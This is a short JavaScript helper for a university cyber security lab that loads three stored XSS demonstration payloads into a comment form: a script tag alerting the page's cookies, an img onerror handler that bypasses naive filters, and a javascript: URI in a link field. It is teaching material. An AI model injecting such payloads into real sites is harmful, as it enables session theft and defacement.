/**
 * Client-Side Helper & Demonstration Script
 * 
 * Course: Cyber Security (IT-30001) - IIIT Allahabad
 * Facilitates quick payload loading during video recording and viva voce.
 */

function loadPayload(type) {
    const authorInput = document.getElementById('author');
    const websiteInput = document.getElementById('website');
    const contentInput = document.getElementById('content');

    if (type === 1) {
        // Standard Script Injection (HTML Body Sink)
        authorInput.value = "Attacker (Script Tag)";
        websiteInput.value = "https://attacker-site.com";
        contentInput.value = "<script>alert('🚨 STORED XSS EXECUTED!\\nActive Cookie: ' + document.cookie)</script>";
    } else if (type === 2) {
        // Event Handler Injection (Bypasses naive <script> filters)
        authorInput.value = "Attacker (Event Handler)";
        websiteInput.value = "https://attacker-site.com";
        contentInput.value = "<img src=x onerror=\"alert('🚨 STORED XSS via IMG onerror! Context: ' + window.location.origin)\" />";
    } else if (type === 3) {
        // URL Context Injection (Demonstrating URI pseudo-protocols)
        authorInput.value = "Attacker (URL Context)";
        websiteInput.value = "javascript:alert('🚨 STORED XSS via javascript: URI in href attribute!')";
        contentInput.value = "Click my portfolio link below to verify URL Context handling!";
    }

    contentInput.focus();
}

console.log("[Lab Info] IIIT Allahabad IT-30001 Stored XSS Demonstration loaded.");
